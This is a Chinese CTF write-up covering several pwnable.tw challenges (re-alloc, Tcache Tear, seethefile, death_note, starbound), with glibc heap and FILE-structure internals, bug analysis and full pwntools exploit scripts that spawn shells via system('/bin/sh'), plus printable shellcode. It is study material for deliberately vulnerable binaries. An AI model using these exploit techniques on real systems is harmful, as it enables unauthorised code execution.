first_chunk_addr = u32(io.recv(4))
heap_addr = first_chunk_addr - 0x490
log.success("heap_addr = " + hex(heap_addr))
'''

environ = elf_libc.symbols['environ'] + libc_addr
#gdb.attach(io,'b * 0x08048B03')
cart('y\x00'+p32(environ)+p32(1)+p32(0x0804B070)+p32(0))

io.recvuntil('27: ')
stack_addr = u32(io.recv(4))
log.success("stack_addr = " + hex(stack_addr))
ebp = stack_addr - 0x104


delete('27'+p32(0x08049068)+p32(1)+p32(elf.got['atoi']+0x22)+p32(ebp-0x8))

system_addr = libc_addr + elf_libc.symbols['system']

io.recvuntil('> ')
io.send(p32(system_addr)+'||/bin/sh\x00')

#gdb.attach(io,'b * 0x08048B03')
io.interactive()
```

总结

glibc中的environ可以用来获取栈地址

双向链表unlink可以写内存

函数调用堆栈变化，劫持ebp可以影响调用者之后的代码处理

got表劫持，相当于hook

# 0x09 re-alloc

![image-20220427103151320](pwnabletw.assets/image-20220427103151320.png)

![image-20220427103210198](pwnabletw.assets/image-20220427103210198.png)

libc版本为2.29，patchelf修改elf文件指定库

```shell
$ ./download_old 2.29-0ubuntu2_amd64
$ patchelf  --set-rpath ~/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ re-alloc
$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so re-alloc
```

## 前置知识

### Realloc函数

```c
void *realloc(void *ptr, size_t size);
```

根据参数情况的不同等效作用：

- ptr == 0, size != 0: malloc(size)
- ptr != 0, size == 0: free(ptr)
- ptr != 0, size != old_size:  释放之前的块再重新分配一个（保存数据）

### tcache

通过wp了解到，涉及tcache（一种bin），顺带学习一下 

tcache 全名 thread local caching，它为每个线程创建一个缓存（cache），从而实现无锁的分配算法，有不错的性能提升。libc-2.26 正式提供了该机制，并默认开启。题目提供的glibc版本为2.29

```shell
$ strings libc-realloc.so|grep glibc
glibc 2.29
```

libc 2.29对tcache的新增检查，多了一个key成员变量

```c
//glibc-2.27
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

//glibc-2.29
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

```c
//glibc-2.27
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}

//glibc-2.29
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;	//new

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;	//new
  return (void *) e;
}
```

当chunk free到tache时，key会置为tache的第一个chunk的地址，当chunk从tcache中取出时，key会置为NULL，key就是哟过来表示这个chunk是否在tcache中。key也用来检查double free，当chunk放入tcache时，检测改chunk的key是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk。

key不等于tcache结构体位置即可绕过double free检测机制，通常配合UAF或chunk overlap。

## 程序分析

```
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice:
```

Alloc功能是，分配size大小的空间到全局变量heap[index]数组上，且末尾添0。heap数据最多存储两个成员。

realloc

```c
int reallocate()
{
  unsigned __int64 index; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *buf; // [rsp+18h] [rbp-8h]

  printf("Index:");
  index = read_long();
  if ( index > 1 || !heap[index] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  buf = realloc((void *)heap[index], size);
  if ( !buf )
    return puts("alloc error");
  heap[index] = buf;
  printf("Data:", size);
  return read_input(heap[index], size);
}
```

更改chunk的size以及更新content内容，当size为0时，相当于执行free函数，但并没有将heap[index]里的指针清0，存在UAF。

Free功能就是realloc(ptr, 0)，之后将指针置NULL

## 漏洞点及利用

reallocate函数中可以控制size=0来实现调用free，但是并没有将指针置NUL，存在UAF。

利用思路：

由两个可控的chunk，两个都写入atoll_got，利用UAF修改某函数的got表项为system函数地址，这个函数的参数要求能通过

由于没有show之类的函数，需要构造泄露，参考wp先利用pirntf_plt覆盖写入tcache bin的atoll，利用格式化字符串泄露栈内容获取libc基址

exp

```python
#!/usr/bin/env python3

from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./re-alloc")
	libc = ELF("./libc-realloc.so")
	io = process(elf.path)
else:
	elf = ELF("./re-alloc")
	libc = ELF("./libc-realloc.so")
	io = remote("chall.pwnable.tw",10106)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

def alloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("1")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Data:")
    io.send(data)

def realloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    if size != 0:
        io.recvuntil("Data:")
        io.send(data)

def free(idx):
    io.recvuntil("Your choice: ")
    io.sendline("3")
    io.recvuntil("Index:")
    io.sendline(str(idx))

alloc(0, 0x18, "AAA")
realloc(0, 0, "")
realloc(0, 0x18, p64(elf.got["atoll"]))
alloc(1, 0x18, "BBB")

realloc(0, 0x28, "CCC")
free(0)
realloc(1, 0x28, "s"*0x10)
free(1)

alloc(0, 0x38, "AAA")
realloc(0, 0, "")
realloc(0, 0x38, p64(elf.got["atoll"]))
alloc(1, 0x38, "BBB")
 
realloc(0, 0x48, "CCC")
free(0)
realloc(1, 0x48, "s"*0x10)
free(1)

alloc(0, 0x38, p64(elf.plt["printf"]))
free("%21$llx")

libc_start_main_ret = int(r(12), 16)
libc_base = libc_start_main_ret - libc.symbols["__libc_start_main"] - 0xeb
system_addr = libc_base + libc.symbols["system"]
success("system address: " + hex(system_addr))
    
sla("Your choice: ", "1")
sla("Index:", "A\x00")
sa("Size:", "A"*15+"\x00")
sa("Data:", p64(system_addr))
free("/bin/sh\x00")

io.interactive()
```

## 总结：

ptmalloc，linux内存分配与释放机制

patchelf替换可执行文件llibc版本

libc2.27加入tcache bin，2.29 tcache结构中加入key，来检测double free

利用格式化字符串泄露libc基址 printf的`%21$llx`表示以16进制64位int的格式打印出第21个参数。

linux64位cdel调用，前6个参数存在寄存器中，其余用栈存储

# 0x0A Tcache Tear

libc版本2.27，存在tcache机制，但结构体中没有上一题的key

```shell
$ file tcache_tear                                                   [12:36:26]
tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped


$ checksec tcache_tear                                               [12:18:43]
[*] '/home/ubuntu/Desktop/pwnable/tcache tear/tcache_tear'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  '/home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/'
    FORTIFY:  Enabled
    
$ ldd tcache_tear                                                    [12:32:41]
	linux-vdso.so.1 (0x00007fff8eb9a000)
	libc.so.6 => /home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6 (0x00007f39571ec000)
	/home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so => /lib64/ld-linux-x86-64.so.2 (0x00007f39575df000)
```

got表不可写，栈保护

## 程序分析

main，输入名字后，显示菜单

```
$$$$$$$$$$$$$$$$$$$$$$$
      Tcache tear     
$$$$$$$$$$$$$$$$$$$$$$$
  1. Malloc            
  2. Free              
  3. Info              
  4. Exit              
$$$$$$$$$$$$$$$$$$$$$$$
```

free选项，可以进行free 8次，且没有清0操作

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 choice; // rax
  unsigned int free_count; // [rsp+Ch] [rbp-4h]

  sub_400948(a1, a2, a3);
  printf("Name:");
  my_read(&Name, 32LL);
  free_count = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = read_num();
      if ( choice != 2 )
        break;
      if ( free_count <= 7 )
      {
        free(ptr);
        ++free_count;
      }
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        show_name();
      }
      else
      {
        if ( choice == 4 )
          exit(0);
Invalid_choice:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( choice != 1 )
        goto Invalid_choice;
      my_malloc();
    }
  }
}
```



add

可以任意申请大小小于0xff的堆块并填写size-0x10大小的内容，然后返回堆块地址到ptr这个bss段的全局变量上，ptr只能保存最后一个申请的堆块的地址。

```c
int sub_400B14()
{
  unsigned __int64 Size; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  Size = read_ll();
  size = Size;
  if ( Size <= 0xFF )
  {
    ptr = malloc(Size);
    printf("Data:");
    read_string((__int64)ptr, size - 16);
    LODWORD(Size) = puts("Done !");
  }
  return Size;
}
```

## 漏洞点

1. free处，存在UAF
2. add函数读入size - 16无符号整型大小，size小于16则可以读入大于堆块size的数据，导致栈溢出



### Tcache Dup任意地址写

```
    malloc(len,'a')
    free()
    free()
    malloc(len,p64(addr))
    malloc(len,'a')
    malloc(len,data)
```

double free之后，tcache bin的fd指向自己

![image-20220608194239293](pwnabletw.assets/image-20220608194239293.png)

![image-20220608194612870](pwnabletw.assets/image-20220608194612870.png)

malloc分配，并填入data"aaaa"，fd被用户内容覆盖

![image-20220608194402869](pwnabletw.assets/image-20220608194402869.png)

![image-20220608194658646](pwnabletw.assets/image-20220608194658646.png)

再次malloc进行分配，tcache指向用户输入内容

![image-20220608194534859](pwnabletw.assets/image-20220608194534859.png)

之后再进行同样大小的malloc，就可以向用户输入地址处写入数据，形成任意地址写。

在本题尝试使用该方法修改Name：

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
myelf  = ELF("./tcache_tear")
io =  process(myelf.path)

sla     = lambda delim,data :  io.sendlineafter(delim,data)
init    = lambda name       :  sla("Name:",name)
malloc  = lambda size,data  : (sla("choice :","1"),sla("Size:",str(size)),sla("Data:",data))
free    = lambda            :  sla("choice :","2")
info    = lambda            :  sla("choice :","3")

# use tcache dup to arbitrary address write
def aaw(len,addr,data):
    malloc(len,'a')
    free()
    free()
    malloc(len,p64(addr))
    malloc(len,'a')
    malloc(len,data)

# use aaw to modify name
name_bss = 0x602060
init('xuan')
aaw(0x50,name_bss,'admin')
info()
io.interactive()
```

![image-20220608195056002](pwnabletw.assets/image-20220608195056002.png)



### tcache house_of_spirit

伪造一个size区域，然后将伪造的fake chunk释放，再次malloc相应大小就可以得到fake_chunk，进行完整堆块内存的控制，目的一般是扩大内存控制范围。

## 利用

寻找获取程序控制流内存数据，一般以下思路：

- 程序自己实现的函数指针：题目中没给出
- GOT表：但该题保护Full RELRO，GOT表不可写
- fini_array段函数指针：main函数while循环。不会返回到libc_start_main，然后执行fini_array段注册的函数
- **libc中的函数指针**，考虑内存泄露

通常考虑利用free堆块到unsorted bin双向链表中获取堆块内容。但题目中限制free次数为7次，刚好限制了绕过tcache的条件；且无法申请大于0xff大小的chunk。

### 泄露libc基址

利用**house of spirit**，伪造大小大于0x410的chunk（由于free时会进行检查，所以该chunk后面的数据也要至少满足两个堆块格式），free掉ptr处（chunk1的数据部分），该chunk进入unsorted bin中，之后info泄露libc地址。

![image-20220609201957178](pwnabletw.assets/image-20220609201957178.png)



本地调试unsorted bins的libc偏移：0x7ffff7dcfca0-0x7ffff79e4000 = **0x3EBCA0**

![image-20220609003924528](pwnabletw.assets/image-20220609003924528.png)

![image-20220609003935923](pwnabletw.assets/image-20220609003935923.png)

```python
name_bss = 0x602060
init(p64(0)+p64(0x501))
aaw(0x50,name_bss+0x500,(p64(0)+p64(0x21)+p64(0)*2)*2)
aaw(0x60,name_bss+0x10,'a')
free()

# use unsorted bin chunk to leak libc
info()
io.recvuntil("Name :"); io.recv(0x10)
libc_addr = u64(io.recv(8)) - 0x3ebca0
log.warn("libc:0x%x"%libc_addr)
io.interactive()
```

### 控制流劫持

在堆的题目中常用的函数是**__free_hook**和**__malloc_hook**，在malloc和free的函数的开始部分，都会去判断是否有相应的钩子函数，方便用户自定义自己的malloc和free函数。

由于free_hook为libc导出符号，所以直接利用赋值语句，就可以直接给libc中的对应变量赋值。动态库除了给我们暴露出函数接口以外还可以暴露出变量接口。

free功能中` free(ptr)`，考虑利用__free_hook，ptr内容可以由add()控制。两个替换思路：

- system函数地址，然后ptr替换参数 /bin/sh
- one_gadget地址

exp

```python
from pwn import *
context(arch='amd64',os='linux')
myelf  = ELF("./tcache_tear")
mylibc = ELF("./libc2.27.so")
#io =  remote("chall.pwnable.tw",10207)
io =  process(myelf.path)

sla     = lambda delim,data :  io.sendlineafter(delim,data)
init    = lambda name       :  sla("Name:",name)
malloc  = lambda size,data  : (sla("choice :","1"),sla("Size:",str(size)),sla("Data:",data))
free    = lambda            :  sla("choice :","2")
info    = lambda            :  sla("choice :","3")

# use tcache dup to arbitrary address write
def aaw(len,addr,data):
    malloc(len,'a')
    free()
    free()
    malloc(len,p64(addr))
    malloc(len,'a')
    malloc(len,data)

# use aaw to modify name
name_bss = 0x602060
init(p64(0)+p64(0x501))
aaw(0x50,name_bss+0x500,(p64(0)+p64(0x21)+p64(0)*2)*2)
aaw(0x60,name_bss+0x10,'a')
free()
info()

io.recvuntil("Name :"); io.recv(0x10)
libc_addr = u64(io.recv(8)) - 0x3ebca0
log.warn("libc:0x%x"%libc_addr)

free_hook = libc_addr + mylibc.symbols["__free_hook"]
'''one_gadget'''
gadget = libc_addr + 0x4f322
aaw(0x70,free_hook,p64(gadget))
'''system("/bin/sh")'''
system    = libc_addr + mylibc.symbols['system']
aaw(0x70,free_hook,p64(system))
malloc(0x80,"$0\x00")

free()
io.interactive()
```

总结

- libc2.27版本，tcache无double free检查，UAF

- tcache dup任意地址写任意内容
- tcache house of spirit，伪造chunk释放到unsorted bins绕过tcache
- free malloc hook可改，用来劫持控制流

# 0x0B seethefile

```shell
$ file seethefile
seethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu3_i386/ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped

$ checksec seethefile
[*] '/home/ubuntu/Desktop/pwnable/seetehfile/seethefile'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8046000)
    RUNPATH:  b'/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu3_i386'
```

## 前置知识

### _IO_FILE利用

**libc实现的文件流机制中存在可以被改写的函数指针**

[IO FILE 之劫持vtable及FSOP (eonew.cn)](http://blog.eonew.cn/2019-07-01.IO FILE 之劫持vtable及FSOP.html#vtable劫持)

[(28条消息) 好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc_hollk的博客-CSDN博客](https://hollk.blog.csdn.net/article/details/113845320)

## 程序分析

用到的全局变量

![image-20220611203725134](pwnabletw.assets/image-20220611203725134.png)

openfile()：magicbuf清0，打开文件获取fp操作，判断文件名是否为flag，是则输出危险输入，结束进程

readfile()：判断fp，若真，fp文件内容读入magicbuf

writefile()：判断magicbuf和filename一些关于flag的关键字，为真，则无法打印

closefile()：关闭fp

case 5：输入 name并打印，然后关闭fp

## 漏洞点：

这里name没有做长度检测，会导致bss溢出

```c
case 5:
	printf("Leave your name :");
	__isoc99_scanf("%s", name);
	printf("Thank you %s ,see you next time\n", name);
	if ( fp )
    fclose(fp);
    exit(0);
    return result;
```

刚好name后面是fp，之后会调用fclode(fp)

## 利用

伪造FILE和vtable，/bin/sh前加||或;作为命令分隔符

```
fp   00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
     *
name 00000020  84 b2 04 08  ff df ff ff  7c 7c 2f 62  69 6e 2f 73  │····│····│||/b│in/s│
     00000030  68 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │h···│····│····│····│
     00000040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
     *
     000000b0  00 00 00 00  00 00 00 00  1c b3 04 08  40 c9 61 f7  │····│····│····│@·a·│
     000000c0  40 c9 61 f7  40 c9 61 f7  0a                        │@·a·│@·a·│·│
     000000c9
```

exp

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./seethefile")
	libc = ELF("./libc_32.so.6")
	io = process(elf.path)
else:
	elf = ELF("./seethefile")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10200)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

openfile = lambda name : (sla("choice :","1"),sla("see :", name))
readfile = lambda : sla("choice :","2")
writefile = lambda : sla("choice :","3")
printname = lambda name : (sla("choice :","5"),sla("name :", name))

# leak libc
openfile("/proc/self/maps")
readfile()
writefile()
readfile()
writefile()
io.recvuntil("0 \n")
libc_addr = int(io.recv(8),16) 
system_addr = libc_addr +libc.symbols['system']
log.success("libc_base:" + hex(libc_addr))
# make fake file
fakeFILE = 0x0804B284
payload  = 'a'*0x20
payload += p32(fakeFILE)

fake_file = p32(0xffffdfff)
fake_file += "||/bin/sh"
fake_file = fake_file.ljust(0x94, "\x00")
fake_file += p32(fakeFILE+0x98)
fake_file += p32(system_addr)*3


payload += fake_file
# get shell
printname(payload)

io.interactive()
```

## 总结

IO_FILE 32位2.23的利用

- fclose根据flag情况调用vtable的不同函数

- 通过bss移除伪造FILE，vtable劫持控制流

# 0x0C death_note

```shell
~/Desktop/pwnable/deathnote ᐅ file death_note 
death_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=547f3a1cf19ffe5798d45def2f4bc5c585af88f5, not stripped

~/Desktop/pwnable/deathnote ᐅ checksec death_note 
[*] '/home/ubuntu/Desktop/pwnable/deathnote/death_note'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

## 程序分析

```
-----------------------------------
             DeathNote             
-----------------------------------
 1. Add a name                     
 2. show a name on the note        
 3. delete a name int the note     
 4. Exit                           
-----------------------------------
```

add_note，读入下标并检查，然后从stdin读入数据，只允许可显示字符通过，通过strdup返回地址存到bss段的全局变量note上

```c
unsigned int add_note()
{
  int v1; // [esp+8h] [ebp-60h]
  char s[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v3; // [esp+5Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input(s, 0x50u);
  if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  *(&note + v1) = strdup(s);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}
```

## 漏洞点

add_note函数里的下标检查没考虑负数情况，可造成任意地址写

## 利用

题目提示，直接输入shellcode，然后任意写修改got表实现控制流劫持，考虑修改puts函数got。

调试查看调用puts时，寄存器值情况，eax记录的是输入下标的值，edx指向name

```
*EAX  0x0
 EBX  0x0
*ECX  0x0
*EDX  0x804b1a0 ◂— 'aaaa'
 EDI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0xffffcef8 —▸ 0xffffcf08 ◂— 0x0
*ESP  0xffffce7c —▸ 0x80487f4 (add_note+165) ◂— add    esp, 0x10
*EIP  0xf7e33c40 (puts) ◂— endbr32 
```

此处需要注意只能用可打印字符构造shellcode

由于限制，可用的汇编指令如下：

```asm
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```

32位shellcode：

```python
#寄存器设置
  ebx = /bin/sh       ## 第一个参数
  ecx = 0             ## 第二个参数
  edx = 0             ## 第三个参数
  eax = 0xb           ## 0xb为系统调用号，即sys_execve()系统函数对应的序号
  int 0x80            ## 执行系统中断
######################################################################### 

## 更精炼的汇编代码
## 
## 这里说明一下，很多博客都会用"/bin//sh"或者官方的"/bin///sh"
## 作为第一个参数，即添加/线来填充空白字符。这里我将"/bin/sh"
## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外
## "/bin/sh"是7个字符，32位中需要两行指令，末尾未填充的空字符
## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。

	push 0x68732f        # 0x68732f --> hs/     little endian
	push 0x6e69622f      # 0x6e69622f --> nib/  little endian
	mov ebx, esp
	xor edx, edx
	xor ecx, ecx
	mov al, 0xb          # al为eax的低8位
	int 0x80
	## 汇编之后字节长度为20字节

##########################################################################
## 构造可见字符的shellcode
##
## push "/bin/sh"
	push 0x68732f
    push 0x6e69622f
    push esp
	pop ebx
## int 0x80 = \xcd\x80
	push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
## set edx -> 0
	push ebx
    pop edx
## set eax -> 0x0b
	push edx 
    pop eax
    xor al, 0x40
    xor al, 0x4b
    
```

puts函数got表中，写入shellcode起始地址

exp

```python

```



# 0x0D starbound

## 程序分析

```c
init();
while ( 1 )
  {
    alarm(60u);
    showmenu();
    if ( !readn(nptr, 256u) )
      break;
    v3 = strtol(nptr, 0, 10);                   // Not check v3
    if ( !v3 )
      break;
    ((void (*)(void))Func_list[v3])();// could lead to out-of-bounds access
  }
  do_bye();
```

main()调用init()和showmenu()进行一些初始化操作，然后通过一个**函数数组**根据用户输入调用相应函数，这里**对用户输入没有做检查**。

![image-20220913221127967](pwnabletw.assets/image-20220913221127967.png)

init()中cmd_go_back()的，设置了show_main_menu的函数指针。

show_main_menu则初始化main中的函数数组选项。

```c
int show_main_menu()
{
  int result; // eax

  puts("\n-+STARBOUND v1.0+-");
  puts("  0. Exit");
  puts("  1. Info");
  puts("  2. Move");
  puts("  3. View");
  puts("  4. Tools");
  puts("  5. Kill");
  puts("  6. Settings");
  puts("  7. Multiplayer");
  __printf_chk(1, "> ");
  for ( result = 0; result <= 9; ++result )
    Func_list[result] = (int)cmd_nop;
  back_or_info = (int)cmd_info;
  enablemult_or_move = (int)cmd_move;
  view_or_dismult = (int)cmd_view;
  mult_recvmap_or_build = (int)cmd_build;
  mult_sendmap_or_kill = (int)cmd_kill;
  func_settings = (int)cmd_settings;
  multpalyer = (int)cmd_multiplayer;
  return result;
}
```

show_multiplayer_menu()和show_settings_menu()也会改变这个函数数组内容

```c
int show_multiplayer_menu()
{
  int result; // eax

  puts("\n-+STARBOUND v1.0: MULTIPLAYER+-");
  puts("  0. Exit");
  puts("  1. Back");
  puts("  2. Enable");
  puts("  3. Disable");
  puts("  4. Teleport");
  puts("  5. Share Your Coordinate");
  __printf_chk(1, "> ");
  for ( result = 0; result <= 9; ++result )
    Func_list[result] = (int)cmd_nop;
  back_or_info = (int)cmd_go_back;
  enablemult_or_move = (int)cmd_multiplayer_enable;
  view_or_dismult = (int)cmd_multiplayer_disable;
  mult_recvmap_or_build = (int)cmd_multiplayer_recvmap;
  mult_sendmap_or_kill = (int)cmd_multiplayer_sendmap;
  return result;
}

int show_settings_menu()
{
  int result; // eax

  if ( dword_80580CC )
    cmd_view();
  puts("\n-+STARBOUND v1.0: SETTINGS+-");
  puts("  0. Exit");
  puts("  1. Back");
  puts("  2. Name");
  puts("  3. IP");
  puts("  4. Toggle View");
  __printf_chk(1, "> ");
  for ( result = 0; result <= 9; ++result )
    Func_list[result] = (int)cmd_nop;
  back_or_info = (int)cmd_go_back;
  enablemult_or_move = (int)cmd_set_name;
  view_or_dismult = (int)cmd_set_ip;
  mult_recvmap_or_build = (int)cmd_set_autoview;
  return result;
}
```

## 前置知识  ret2dl_resolve

题目没有给出libc版本，后门函数和system()等，所以得利用ret2dl_resolve

## 利用

由于main中没有对用户输入检查，可以导致越界访问，查看bss段是否有可以利用的字段。注意到变量Name，可以通过`cmd_set_name()`控制其内容。

![image-20220914144432768](pwnabletw.assets/image-20220914144432768.png)

Name与Func_list偏移为`(0x08058154-0x080580D0)/4=33`，利用Func_list[-33]就能越界访问到该字段。考虑通过数组越界访问到一些恶意构造的函数指针，就能劫持控制流。写入顺序为：

```
show_main_menu() --> show_settings_menu() --> cmd_set_name()
```

